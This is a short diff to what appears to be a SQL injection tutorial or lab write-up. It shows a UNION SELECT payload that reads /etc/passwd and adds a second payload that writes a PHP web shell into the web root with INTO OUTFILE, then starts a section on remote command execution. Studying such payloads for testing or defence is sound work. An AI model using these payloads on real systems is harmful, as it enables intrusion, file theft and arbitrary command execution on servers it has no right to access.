@@ -217,6 +217,12 @@ The below URL is a way to inject the query, the hash symbol `#` is to comment al
 Finally, the payload is:
 ```Bash
 id=-1 UNION SELECT 1, 2, LOAD_FILE('/etc/passwd'), 4#
+
+id=-1 UNION SELECT 1, '<?php system($_GET["c"]); ?>', 3, 4 INTO OUTFILE '/var/www/css/shell.php'#
 ```
 
 Which would display the whole content of `/etc/passwd` at the `Text` field.
+
+## 3.2. A remotely executable web shell.
+
+This is an upgrade. While the SQL injection above simply shows all the necessary things about the system, it is sometimes restricted. For example, the `LOAD_FILE` can only load existed files, it does not give enough flexibility to mess around the system.
